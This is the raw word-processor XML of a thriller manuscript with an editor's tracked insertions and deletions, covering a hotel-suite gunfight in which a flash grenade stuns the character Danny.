        <w:t>ground far below.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the balcony cleared, Eugene tilted his head to the side to crack his neck, and came over to his stabbed victim to retrieve his knife.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cedarwood doors of the Presidential Suite crashed open. Sergey stood in the doorway, MAC-10 in hand, crouched behind his ballistic shield. Behind him, in the antechamber, Leo took aim with his M4.</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mercenaries scrambled. Some began </w:t>
      </w:r>
      <w:del w:id="2860" w:author="TextVet" w:date="2016-03-28T16:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00644259">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">to </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shoot</w:t>
      </w:r>
      <w:ins w:id="2861" w:author="TextVet" w:date="2016-03-28T16:33:00Z">
        <w:r w:rsidR="00644259">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their bullets deflected and bounced at unpredictable angles off</w:t>
      </w:r>
      <w:del w:id="2862" w:author="TextVet" w:date="2016-03-28T16:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A3072">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sergey’s shield with high-pitched “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ploink</w:t>
      </w:r>
      <w:ins w:id="2863" w:author="TextVet" w:date="2016-03-28T16:32:00Z">
        <w:r w:rsidR="00630DE9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2864" w:author="TextVet" w:date="2016-03-28T16:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00630DE9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>!</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:del w:id="2865" w:author="TextVet" w:date="2016-03-28T16:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00630DE9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> noises</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wiry man who had held Danny at gunpoint was crouched near the glass coffee table. Upon Sergey’s entrance, he looked around frantically for someplace to hide. At the exact moment he turned to face the front doorway, a low boom burst </w:t>
      </w:r>
      <w:del w:id="2866" w:author="TextVet" w:date="2016-03-28T16:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF7E41">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">out </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>from Leo’s rifle.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Danny </w:t>
      </w:r>
      <w:r w:rsidR="00080DF8">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>vaguely registered</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the black form zip through the air</w:t>
      </w:r>
      <w:r w:rsidR="00F32F2D">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, a ghost’s shadow</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00080DF8">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F37905">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lamm</w:t>
      </w:r>
      <w:r w:rsidR="00F37905">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the shark-faced man in the chest</w:t>
      </w:r>
      <w:r w:rsidR="00F37905">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F37905">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he projectile did not penetrate, but </w:t>
      </w:r>
      <w:r w:rsidR="00F37905">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sledgehammer</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed him back down. The man </w:t>
      </w:r>
      <w:ins w:id="2867" w:author="TextVet" w:date="2016-03-28T16:42:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hurtled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2868" w:author="TextVet" w:date="2016-03-28T16:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fell backward</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> against the coffee table, upending it</w:t>
      </w:r>
      <w:ins w:id="2869" w:author="TextVet" w:date="2016-03-28T16:43:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, sending</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2870" w:author="TextVet" w:date="2016-03-28T16:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. T</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2871" w:author="TextVet" w:date="2016-03-28T16:43:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> t</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he toolbox and the towel-covered crystal bowl</w:t>
      </w:r>
      <w:del w:id="2872" w:author="TextVet" w:date="2016-03-28T16:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> began to tumble to the floor</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2873" w:author="TextVet" w:date="2016-03-28T16:43:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2874" w:author="TextVet" w:date="2016-03-28T16:44:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>to new locations</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2875" w:author="TextVet" w:date="2016-03-28T16:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">But </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Danny didn’t actually see or hear them land. </w:t>
      </w:r>
      <w:del w:id="2876" w:author="TextVet" w:date="2016-03-28T16:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">For, in the instant that it took for them to drop, </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2877" w:author="TextVet" w:date="2016-03-28T16:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>t</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2878" w:author="TextVet" w:date="2016-03-28T16:46:00Z">
        <w:r w:rsidR="00293950">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he thing that had struck the man’s chest exploded.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had come from the underslung M203 projectile launcher of Leo’s rifle. It was black with a rubbery surface, about the size of a pill bottle. Its pyrotechnic formula was designed to throw no shrapnel and spout no flame. Instead, for one infinitessimal instant, it burned twice as bright as the sun and boomed louder than a jet engine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2879" w:author="TextVet" w:date="2016-03-28T16:46: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was a 40-millimeter spin-stabilized flash grenade. And when it went off, Danny was looking at it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FA02A6" w:rsidRPr="000D3488" w:rsidRDefault="00FA02A6" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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There was a crushing sensation</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> as his body was slammed against a wall of solid sound. The very air around him tried to squeeze the life out of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Suddenly, there was no gunfire. There were no men shouting, no bullets slicing through the air. There was no gravity, no up or down or sideways. There was only the pale void — directionless, infinite.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couldn’t tell how long he spent floating in that emptiness, blind and deaf and without bearing. The flash grenade was a nonlethal munition, but it was unmistakably a weapon — an energy weapon. It was a perfectly crafted attack against the human body’s sensory systems, exploiting overflow vulnerabilities in its acoustic and electromagnetic transduction machinery. And in that moment, Danny knew exactly what it was like to be an electronic device getting hit by a pulse from his HERF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Formless ripples eventually danced in the milky emptiness. Shimmering ghosts coalesced into shapes. Colors and hues, pale and washed-out at first, slowly re-saturated.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saw a large, dark shape rushing at him out of the snowy void.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tried to dodge the oncoming blur, but he was too unbalanced. Before he could even move, the shadow was upon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felt his body suddenly pressed against a bulky torso clad in plate-reinforced bulletproof padding, like the chest of a charging bull dressed for battle. A meaty arm grabbed him under his armpit. The dark figure pulled him off</w:t>
      </w:r>
      <w:del w:id="2880" w:author="TextVet" w:date="2016-03-28T16:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A07304">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his unsteady feet and dragged him across the unseen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Beneath the </w:t>
      </w:r>
      <w:ins w:id="2881" w:author="TextVet" w:date="2016-03-28T16:50:00Z">
        <w:r w:rsidR="000A6C94">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ringing </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>din</w:t>
      </w:r>
      <w:del w:id="2882" w:author="TextVet" w:date="2016-03-28T16:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C6750">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in his ears</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he heard the faint tinny chatter of many voices. “Danny! Are you okay?” “Talk to us!” “Danny, what's going on?” He felt their vibrations directly on the skin of his ear, and realized that they were coming from his Bluetooth headset.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From the other side of the dark figure, </w:t>
      </w:r>
      <w:del w:id="2883" w:author="TextVet" w:date="2016-03-28T16:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD183D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>there came h</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2884" w:author="TextVet" w:date="2016-03-28T16:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD183D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">igh-pitched plinks of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">bullets </w:t>
      </w:r>
      <w:ins w:id="2885" w:author="TextVet" w:date="2016-03-28T16:52:00Z">
        <w:r w:rsidR="00AD183D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">were </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ricocheting off</w:t>
      </w:r>
      <w:del w:id="2886" w:author="TextVet" w:date="2016-03-28T16:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD183D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> reinforced polymer</w:t>
      </w:r>
      <w:ins w:id="2887" w:author="TextVet" w:date="2016-03-28T16:52:00Z">
        <w:r w:rsidR="00AD183D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, zinging and plinking</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Somewhere off to his flank, the periodic </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rat-tat-tat!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of fully-automatic gunfire cracked through the air, low</w:t>
      </w:r>
      <w:ins w:id="2888" w:author="TextVet" w:date="2016-03-28T16:54:00Z">
        <w:r w:rsidR="006739FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2889" w:author="TextVet" w:date="2016-03-28T16:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006739FA">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muffled</w:t>
      </w:r>
      <w:ins w:id="2890" w:author="TextVet" w:date="2016-03-28T16:54:00Z">
        <w:r w:rsidR="006739FA">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as though heard from underwater. Danny’s nostrils filled with the acrid, metallic smell of </w:t>
      </w:r>
      <w:ins w:id="2891" w:author="TextVet" w:date="2016-03-28T16:55:00Z">
        <w:r w:rsidR="004C2883">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>cordite</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2892" w:author="TextVet" w:date="2016-03-28T16:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C2883">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>burnt gunpowder</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texture of the light and shadows around him </w:t>
      </w:r>
      <w:ins w:id="2893" w:author="TextVet" w:date="2016-03-28T16:56:00Z">
        <w:r w:rsidR="00E85823">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>shift</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2894" w:author="TextVet" w:date="2016-03-28T16:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E85823">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>chang</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
